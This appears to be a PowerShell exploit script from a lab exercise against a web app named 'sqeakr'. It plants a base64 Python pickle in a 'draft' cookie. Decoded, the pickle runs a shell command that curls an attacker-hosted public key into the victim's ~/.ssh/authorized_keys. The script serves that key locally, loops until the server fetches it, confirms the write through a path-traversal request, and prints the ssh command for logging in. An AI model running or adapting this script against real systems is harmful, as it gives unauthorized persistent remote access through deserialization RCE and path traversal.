$AuthToken = 'gAN9cQAoWAQAAABhdXRocQFLAFgGAAAAdXNlcmlkcQJYJAAAADMxZGE4YmExLWNlMGEtNDVmZC05YzcyLTU1NDc3YTFkM2Y2OHEDdS4i'
# see exploit.py for generating this serialized object
$DraftCookie = 'gASVhwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjGxta2RpciAtcCAvaG9tZS9zdHVkZW50Ly5zc2g7Y3VybCBodHRwOi8vMTkyLjE2OC4xMTkuMTMwL3NxZWFrci5rZXkucHViIC1vIC9ob21lL3N0dWRlbnQvLnNzaC9hdXRob3JpemVkX2tleXOUhZRSlC4='
$Uri = 'http://sqeakr/api/draft'

#ssh-keygen -t rsa -b 2048 -C 'student@192.168.130.247' -f sqeakr -P ''

$InitialStateReq = @{
  Uri = $Uri
  SessionVariable = 'Session'
  Method = 'GET'
  Headers = @{
      authtoken = $AuthToken
  }
}
Invoke-WebRequest @InitialStateReq

$Cookie = [System.Net.Cookie]::new("draft",$DraftCookie)
$Cookie.HttpOnly = $true
$Session.Cookies.Add($uri,$Cookie)
$Session.Cookies.GetAllCookies()

Write-Output "Starting WebServer"
$ServerJob = Start-Job -ScriptBlock { python3 -m http.server --directory ./sqeakr-keys 80 }

$RceReq = @{
  Uri = $Uri
  WebSession = $Session
  Method = 'GET'
  Headers = @{
      authtoken = $AuthToken
  }
}


While ($true) {
  Invoke-WebRequest @RceReq | Out-Null
  $ServerLogs = Receive-Job -Job $ServerJob -Keep *>&1;
  $MagicString = $ServerLogs | Select-String -Pattern ".*sqeakr.key.pub.*";
  if($MagicString.Matches.Length -gt 0) {
    Write-Output "Received request for .ssh key"
    $ServerLogs
    $res = Invoke-WebRequest -Uri http://sqeakr/api/avatars/....//....//....//....///home/student/.ssh | select content 
    $json = $res.Content | ConvertFrom-Json
    if($json.Files -eq 'authorized_keys') {Write-Output "Verified SSH Key was written"}
    Write-Output "ssh -i path/to/private/key student@sqeakr"
    break
  }
}


Remove-Job -Job $ServerJob -Force;

